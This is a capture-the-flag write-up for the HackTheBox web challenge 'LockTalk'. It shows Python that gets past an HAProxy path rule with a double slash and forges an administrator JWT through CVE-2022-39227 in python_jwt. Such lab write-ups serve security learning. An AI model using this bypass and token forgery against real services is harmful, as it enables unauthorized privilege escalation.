# LockTalk

## Challenge
In "The Ransomware Dystopia," LockTalk emerges as a beacon of resistance against the rampant chaos inflicted by ransomware groups. In a world plunged into turmoil by malicious cyber threats, LockTalk stands as a formidable force, dedicated to protecting society from the insidious grip of ransomware. Chosen participants, tasked with representing their districts, navigate a perilous landscape fraught with ethical quandaries and treacherous challenges orchestrated by LockTalk. Their journey intertwines with the organization's mission to neutralize ransomware threats and restore order to a fractured world. As players confront internal struggles and external adversaries, their decisions shape the fate of not only themselves but also their fellow citizens, driving them to unravel the mysteries surrounding LockTalk and choose between succumbing to despair or standing resilient against the encroaching darkness.

### Attachment
- [web_locktalk.zip](./handouts/web_locktalk.zip)

## Solution
In this web challenge, we're dealing with a web application, that offers three distinct endpoints:
1. Generate a JWT token
2. Read a chat history while specifying a valid JWT and
3. Retrieve the flag using a valid JWT, that specifies the `role=administrator`.

### Step 1: Generating a valid JWT:
Unfortunately the `conf/haproxy.cfg` file disallows any http request to the first endpoint `http://server-ip:port/api/v1/get_ticket`, that would allow us to generate a valid JWT. Luckily for us, we can trick this config by instead asking for `http://server-ip:port//api/v1/get_ticket` (note the doule `//` after the port) and receive a valid JWT, that specified the `role=guest`.
```python
import requests
import json

server = '83.136.255.230'
port = 37324

base_uri = f'http://{server}:{port}/'
get_ticket_endpoint = '/api/v1/get_ticket' # needs the extra "/" at the beginning to circumvent the haproxy.cfg!

# Get any valid JWT:
resp = requests.get(base_uri + get_ticket_endpoint)
jwt_guest = json.loads(resp.text)['ticket: ']
print('JWT for guest:', jwt_guest)
```

### Step 2: Using CVE-2022-39227 to escalate to administrator
Because the python-server uses the vulnerable version 3.3.3 of `python_jwt`, we can apply the exploit known for CVE-2022-39227 to update our JWT to pretend to be an administrator:

I've slightly modified the original `cve_2022_39227.py` (from Github, see references) to be able to use their code to update my JWT. This way we can supply the guest-JWT as a string and our claim to be of `role=administrator` and receive a new token including our claim, which the server will aknowledge.
```python
def fake_token(token, claim):
	# Split JWT in its ingredients
	[header, payload, signature] = token.split(".")
	print(f"[+] Retrieved base64 encoded payload: {payload}")
	# Payload is relevant
	parsed_payload = loads(base64url_decode(payload))
	print(f"[+] Decoded payload: {parsed_payload}")
	# Processing of the user input and inject new claims
	try:
		claims = claim.split(",")
		for c in claims:
			key, value = c.split("=")
			parsed_payload[key.strip()] = value.strip()
	except:
		print("[-] Given claims are not in a valid format")
		exit(1)
	# merging. Generate a new payload
	print(f'[+] Inject new "fake" payload: {parsed_payload}')
	fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))
	print(f'[+] Fake payload encoded: {fake_payload}\n')	
	# Create a new JWT Web Token
	new_payload = '{"' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"}'
	print(f'[+] New token:\n {new_payload}\n')
	return new_payload
```

```python
from cve_2022_39227 import fake_token

# Fake the admin token
jwt_admin = fake_token(jwt_guest, 'role=administrator,user=administrator')
```

### Step 3: Retrieve the flag
At this point, we can use our forged token to access the `/api/v1/fag` endpoint to retrieve the flag:
```python
# Get the flag:
resp = requests.get(base_uri + flag_endpoint, headers={'Authorization': jwt_admin})
print('Flag:', json.loads(resp.text)['message'])
```
And that's it: `HTB{h4Pr0Xy_n3v3r_D1s@pp01n4s}`


## Resources
- [Github: Exploit for CVE-2022-39227 by user0x1337](https://raw.githubusercontent.com/user0x1337/CVE-2022-39227/main/cve_2022_39227.py)